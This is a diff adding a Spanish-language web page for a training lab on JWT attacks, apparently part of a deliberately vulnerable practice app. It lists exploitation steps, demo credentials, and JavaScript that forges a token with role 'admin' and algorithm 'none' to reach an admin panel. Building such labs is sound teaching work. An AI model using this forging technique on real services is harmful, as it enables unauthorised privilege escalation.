@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <link rel="stylesheet" href="/css/style.css" />
+  <title>Laboratorio JWT Attacks</title>
+</head>
+<body>
+  <div class="container">
+
+    <h1>Laboratorio JWT Attacks</h1>
+
+    <h3>
+      Modo actual:
+      <span class="<%= mode === 'vulnerable' ? 'mode-vulnerable' : 'mode-secure' %>">
+        <%= mode.toUpperCase() %>
+      </span>
+    </h3>
+
+    <a href="/labs/jwt/switch-mode" class="btn">
+      Cambiar a modo <%= mode === "vulnerable" ? "SEGURO" : "VULNERABLE" %>
+    </a>
+
+    <hr>
+
+    <p>
+      En este laboratorio aprenderás cómo funcionan los JSON Web Tokens (JWT) y cómo pueden
+      ser manipulados cuando el servidor no los valida correctamente. Tu objetivo es acceder
+      al panel de administración siendo un usuario normal.
+    </p>
+
+    <h4>Pasos para explotar la vulnerabilidad:</h4>
+    <table>
+      <tr><th>Paso</th><th>Acción</th></tr>
+      <tr><td>1</td><td>Inicia sesión con las credenciales de usuario normal</td></tr>
+      <tr><td>2</td><td>Observa el token JWT que recibes y su payload decodificado</td></tr>
+      <tr><td>3</td><td>Usa la herramienta de manipulación para generar un token con role: admin</td></tr>
+      <tr><td>4</td><td>El token manipulado usa algoritmo "none" eliminando la firma</td></tr>
+      <tr><td>5</td><td>Intenta acceder al panel de admin con el token manipulado</td></tr>
+    </table>
+
+    <hr>
+
+    <!-- Login -->
+    <h3>// Iniciar sesión</h3>
+    <p style="margin-bottom:1rem;">Credenciales: <code>user@cyberlab.com</code> / <code>password123</code></p>
+
+    <form action="/labs/jwt/login" method="POST">
+      <label>Email:</label><br>
+      <input type="text" name="email" placeholder="user@cyberlab.com" required /><br><br>
+      <label>Password:</label><br>
+      <input type="password" name="password" placeholder="password123" required /><br><br>
+      <button type="submit" class="btn">Iniciar sesión</button>
+    </form>
+
+    <hr>
+
+    <!-- Mensaje de resultado -->
+    <% if (message) { %>
+      <%
+        let msgClass = 'msg-warning';
+        if (message.includes('correctas') || message.includes('correcto') || message.includes('Login')) msgClass = 'msg-success';
+        if (message.includes('incorrectas') || message.includes('denegado') || message.includes('invalido') || message.includes('Error')) msgClass = 'msg-error';
+      %>
+      <div class="msg-box <%= msgClass %>">
+        <%= message %>
+      </div>
+    <% } %>
+
+    <!-- Token recibido -->
+    <% if (token) { %>
+      <h3>// Token JWT recibido</h3>
+      <pre id="original-token"><%= token %></pre>
+
+      <h3>// Header decodificado</h3>
+      <pre><%= decodedHeader %></pre>
+
+      <h3>// Payload decodificado</h3>
+      <pre><%= decodedPayload %></pre>
+
+      <hr>
+
+      <!-- Herramienta de manipulación -->
+      <h3>// Herramienta de manipulación de token</h3>
+      <p style="margin-bottom:1rem;">
+        Usa esta herramienta para generar automáticamente un token manipulado
+        con <code>role: admin</code> y algoritmo <code>none</code>.
+      </p>
+
+      <div style="display:flex;gap:1rem;margin-bottom:1rem;flex-wrap:wrap;">
+        <button class="btn" onclick="generarTokenManipulado()">Generar token manipulado</button>
+        <button class="btn" onclick="copiarToken()">Copiar token</button>
+      </div>
+
+      <div id="token-manipulado-box" style="display:none;">
+        <h4>Token manipulado generado:</h4>
+        <pre id="token-manipulado" style="word-break:break-all;white-space:pre-wrap;color:var(--yellow);"></pre>
+        <p style="color:var(--text-dim);font-family:var(--mono);font-size:0.75rem;margin-top:0.5rem;">
+          Header: alg=none | Payload: role=admin | Firma: eliminada
+        </p>
+      </div>
+
+      <hr>
+    <% } %>
+
+    <!-- Acceder al panel de admin con token -->
+    <h3>// Acceder al panel de admin</h3>
+    <p style="margin-bottom:1rem;">Pega aquí tu token (original o manipulado) para intentar acceder al panel de administración:</p>
+
+    <form action="/labs/jwt/admin" method="GET">
+      <input type="text" id="token-input" name="token" placeholder="Pega aquí tu JWT..." required /><br><br>
+      <button type="submit" class="btn">Acceder al panel de admin</button>
+    </form>
+
+    <hr>
+
+    <p><a href="/labs/jwt/code" class="btn">Mostrar código vulnerable</a></p>
+    <a href="/" class="btn">Volver</a>
+
+  </div>
+
+  <script>
+    function base64urlEncode(str) {
+      return btoa(unescape(encodeURIComponent(str)))
+        .replace(/\+/g, '-')
+        .replace(/\//g, '_')
+        .replace(/=+$/, '');
+    }
+
+    function generarTokenManipulado() {
+      const tokenOriginal = document.getElementById('original-token').innerText.trim();
+      const partes = tokenOriginal.split('.');
+      if (partes.length < 2) return;
+
+      try {
+        // Decodificamos el payload original
+        const payloadOriginal = JSON.parse(decodeURIComponent(escape(atob(
+          partes[1].replace(/-/g, '+').replace(/_/g, '/')
+        ))));
+
+        // Modificamos el rol a admin
+        payloadOriginal.role = 'admin';
+
+        // Nuevo header con alg:none
+        const nuevoHeader = base64urlEncode(JSON.stringify({ alg: 'none', typ: 'JWT' }));
+        const nuevoPayload = base64urlEncode(JSON.stringify(payloadOriginal));
+
+        // Token sin firma (punto final vacío)
+        const tokenManipulado = nuevoHeader + '.' + nuevoPayload + '.';
+
+        document.getElementById('token-manipulado').innerText = tokenManipulado;
+        document.getElementById('token-manipulado-box').style.display = 'block';
+        document.getElementById('token-input').value = tokenManipulado;
+      } catch(e) {
+        alert('Error al procesar el token: ' + e.message);
+      }
+    }
+
+    function copiarToken() {
+      const token = document.getElementById('token-manipulado').innerText;
+      if (!token) { alert('Primero genera el token manipulado'); return; }
+      navigator.clipboard.writeText(token).then(() => {
+        alert('Token copiado al portapapeles');
+      });
+    }
+  </script>
+
+</body>
+</html>
